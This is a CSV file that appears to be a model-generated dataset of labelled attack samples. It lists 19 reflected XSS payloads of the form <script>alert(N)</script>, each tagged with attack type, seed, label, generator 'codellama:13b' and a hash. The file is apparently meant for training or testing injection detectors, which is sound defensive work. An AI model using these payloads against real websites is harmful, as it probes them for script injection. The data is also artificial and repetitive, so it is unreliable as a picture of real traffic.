payload,attack_type,attack_family,seed,label,generator,model_tag,payload_sha256
<script>alert(2)</script>,xss,reflected,42,1,codellama,codellama:13b,141ce7a938b5973dd71c90bcdd7e4097317ee7374259cf6d8774fdfd86c1f8ea
<script>alert(3)</script>,xss,reflected,42,1,codellama,codellama:13b,21a39046c56ea189a066b2a783951e16684488e32b239b2a62a0d5cd63fd6b43
<script>alert(4)</script>,xss,reflected,42,1,codellama,codellama:13b,19ca54d7e700913dafb619698732ebf1efee7bdb8b319012d10facd4accafac0
<script>alert(5)</script>,xss,reflected,42,1,codellama,codellama:13b,68514ce5ef5f81cbf9b5954c0f35b471c5b9e184ed23942f8b3b9db12838e123
<script>alert(6)</script>,xss,reflected,42,1,codellama,codellama:13b,b8ac5cb5ec978ffb6e7784a99fb82ef84a7e02827db21bb1552b348351d59c5b
<script>alert(7)</script>,xss,reflected,42,1,codellama,codellama:13b,44becf147552e0c66f649562b19f799b4a6acb5a59ccb894f76a60b39e9cdb96
<script>alert(8)</script>,xss,reflected,42,1,codellama,codellama:13b,86abb8b2845d1bd7ab42d30c877b9fce9f741255adeb89f5f176789b8fc11798
<script>alert(9)</script>,xss,reflected,42,1,codellama,codellama:13b,348efcc7a52013b4a5ff3b402cbe391079cc729acfb9fdc4e57d941aec8d9149
<script>alert(10)</script>,xss,reflected,42,1,codellama,codellama:13b,35d879544ad0dc7ac6d6d9c597d06bd03e38bc38f91307bd805e432722ff5a47
<script>alert(11)</script>,xss,reflected,42,1,codellama,codellama:13b,469ef1d36049fdddaedf268748e707d1d7c5bd5807eb0500e41b129a4938b08d
<script>alert(12)</script>,xss,reflected,42,1,codellama,codellama:13b,95750378b34532f86732a6f6b6243912bb593ef6b8728fa03b095b4221688bd3
<script>alert(13)</script>,xss,reflected,42,1,codellama,codellama:13b,4a2c000aa89b1b170c6cf129f998a18f119a2a4bdc4f06fac32486c5ba2d2682
<script>alert(14)</script>,xss,reflected,42,1,codellama,codellama:13b,487a766c045d56423c7be302ef0c608b601a2e18ec3dd4eb98a3ace7d3b8e408
<script>alert(15)</script>,xss,reflected,42,1,codellama,codellama:13b,0fda019052f188276ba7b87f4c61f69bb08f3603d4f74b6c3a10e9b87c340f4e
<script>alert(16)</script>,xss,reflected,42,1,codellama,codellama:13b,23b7365f1ac94a304a7d34cdf7ae3a70e5b69d117f8fecc857ecc682890ba1ec
<script>alert(17)</script>,xss,reflected,42,1,codellama,codellama:13b,5e53f5807a5da8e96df9f4063ee2ad208d2c432fd0e48c1fa8aea309bfbeba8c
<script>alert(18)</script>,xss,reflected,42,1,codellama,codellama:13b,ee54fb99b08c4af9c6f4a14cfedb9dac54b44a1d5a1675354cdf45386798f5d4
<script>alert(19)</script>,xss,reflected,42,1,codellama,codellama:13b,3e3fbe6fe1b7c54eca50b94b5b03b9b26223b00a09b67f87bc58237cc4c88094
<script>alert(20)</script>,xss,reflected,42,1,codellama,codellama:13b,ecedc0091e60e14651d6f33e39af5be732ed9a0ae730d6b57c651c1904f4fd03
